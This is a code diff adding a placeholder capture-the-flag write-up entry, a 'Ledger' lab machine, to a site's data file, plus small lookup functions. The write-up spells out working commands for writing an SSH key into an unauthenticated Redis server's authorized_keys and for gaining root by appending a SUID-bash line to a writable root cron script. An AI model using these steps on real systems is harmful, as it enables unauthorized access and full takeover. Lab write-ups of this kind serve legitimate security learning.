@@ -111,8 +111,99 @@ root
       },
     ],
   },
+  {
+    slug: "ledger",
+    name: "Ledger",
+    platform: "HackTheBox",
+    difficulty: "Easy",
+    os: "Linux",
+    date: "2026-03-02",
+    tags: ["redis", "ssh-keys", "cron"],
+    summary:
+      "An easy Linux box with an unauthenticated Redis instance that's abused to plant an SSH key, then a root cron job that finishes the job. Placeholder writeup used to design this section's layout.",
+    phases: [
+      {
+        title: "Recon",
+        body: `\`\`\`shell
+$ nmap -p- -T4 10.10.71.9
+PORT     STATE SERVICE
+22/tcp   open  ssh
+6379/tcp open  redis
+\`\`\`
+
+Redis with no auth configured:
+
+\`\`\`shell
+$ redis-cli -h 10.10.71.9 ping
+PONG
+$ redis-cli -h 10.10.71.9 config get requirepass
+1) "requirepass"
+2) ""
+\`\`\`
+
+An open, unauthenticated Redis instance is enough on its own &mdash; the
+next step is turning read/write access into code execution.`,
+      },
+      {
+        title: "Foothold",
+        body: `Redis can write arbitrary files, so the standard move is to write an
+SSH public key into a user's \`authorized_keys\`:
+
+\`\`\`shell
+$ (echo -e "\\n\\n"; cat id_rsa.pub; echo -e "\\n\\n") > key.txt
+$ redis-cli -h 10.10.71.9 flushall
+$ cat key.txt | redis-cli -h 10.10.71.9 -x set ssh_key
+$ redis-cli -h 10.10.71.9 config set dir /home/ledger/.ssh
+$ redis-cli -h 10.10.71.9 config set dbfilename authorized_keys
+$ redis-cli -h 10.10.71.9 save
+\`\`\`
+
+\`\`\`shell
+$ ssh -i id_rsa ledger@10.10.71.9
+ledger@ledger:~$ id
+uid=1000(ledger) gid=1000(ledger) groups=1000(ledger)
+\`\`\`
+
+Grab the user flag from \`/home/ledger/user.txt\`.`,
+      },
+      {
+        title: "Privilege escalation",
+        body: `\`/etc/crontab\` is world-readable and shows a root cron job running a
+script the \`ledger\` user can write to:
+
+\`\`\`shell
+$ cat /etc/crontab
+* * * * * root /opt/ledger/sync.sh
+$ ls -la /opt/ledger/sync.sh
+-rwxrwxr-x 1 root ledger /opt/ledger/sync.sh
+\`\`\`
+
+Append a reverse shell (or SUID bash copy) to the script and wait for the
+next minute's run:
+
+\`\`\`shell
+$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/ledger/sync.sh
+$ sleep 60 && /tmp/rootbash -p
+rootbash-5.1# whoami
+root
+\`\`\`
+`,
+      },
+      {
+        title: "Loot",
+        body: `**User flag:** \`HTB{placeholder_user_flag_ledger}\`
+
+**Root flag:** \`HTB{placeholder_root_flag_ledger}\`
+`,
+      },
+    ],
+  },
 ];
 
 export function getMachine(slug: string): Machine | undefined {
   return machines.find((m) => m.slug === slug);
+}
+
+export function machinesByPlatform(platform: Machine["platform"]): Machine[] {
+  return machines.filter((m) => m.platform === platform);
 }
